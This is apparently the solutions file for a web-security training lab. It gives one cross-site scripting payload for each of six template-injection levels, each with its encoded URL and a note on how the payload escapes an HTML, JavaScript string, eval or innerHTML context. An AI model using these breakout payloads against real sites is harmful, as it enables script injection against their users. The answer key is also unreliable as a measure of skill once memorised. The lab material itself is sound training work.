# template — solutions

Server-side and client-side template-style substitution sinks under `/template/`.

### template-injection-level1

`/template/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: server gsub replaces {{user_input}}; raw HTML body sink

### template-injection-level2

`/template/level2/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: inside JS single-quoted string; break out via `</script>`

### template-injection-level3

`/template/level3/?query=%22;alert(1);//`

- payload: `";alert(1);//`
- context: `eval('"' + userExpression + '"')` — close string, run, comment

### template-injection-level4

`/template/level4/?query=%27;alert(1);//`

- payload: `';alert(1);//`
- context: inside single-quoted JS var then innerHTML; break string

### template-injection-level5

`/template/level5/?query=%27;alert(1);//`

- payload: `';alert(1);//`
- context: inside single-quoted items[0] then innerHTML `<li>`

### template-injection-level6

`/template/level6/?query=%27;alert(1);//`

- payload: `';alert(1);//`
- context: `<script` and `</script>` HTML-encoded; break single-quoted JS var
